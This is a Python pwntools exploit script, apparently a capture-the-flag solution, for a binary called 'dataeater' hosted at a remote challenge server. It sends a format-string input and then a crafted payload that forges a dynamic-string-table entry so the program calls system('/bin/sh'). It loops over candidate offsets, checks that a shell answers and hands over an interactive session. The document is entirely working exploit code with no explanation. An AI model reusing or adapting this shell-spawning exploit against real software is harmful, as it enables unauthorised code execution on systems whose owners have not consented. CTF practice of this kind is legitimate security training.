#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
  if args.GDB:
    context.terminal = ["/mnt/c/wsl-terminal/open-wsl.exe", "-e"]
    return gdb.debug([exe] + argv, gdbscript=gs, *a, **kw)
  elif args.REMOTE:
    return remote('mc.ax', 31869, *a, **kw)
  else:
    return process([exe] + argv, *a, **kw)

gs = '''
init-pwndbg
continue
'''.format(**locals())

exe = './dataeater'
elf = context.binary = ELF(exe, checksec=False)
# warning/info/debug
context.log_level = 'info'

def sice(k):
  print(k)
  try:
    # do pwning
    io = start()
    io.sendline(f'%s%{k}$s'.encode())
    payload = flat({
      0:[
        b'/bin/sh\0',
        elf.sym['buf'] + 16 - elf.section('.dynstr').index(b'memset\x00'),
        b'system\0 ',
        p64(0)*13,
        p64(elf.sym['buf'])[:-1]
      ]
    })
    io.sendline(payload)

    # make sure we got a shell
    io.recv(timeout=1)
    io.sendline(b'echo ginkoid')
    io.recvuntil(b'ginkoid')

    io.interactive()
    return True
  except EOFError:
    return False
  finally:
    io.close()

for k in range(30, 50):
  if sice(k): break
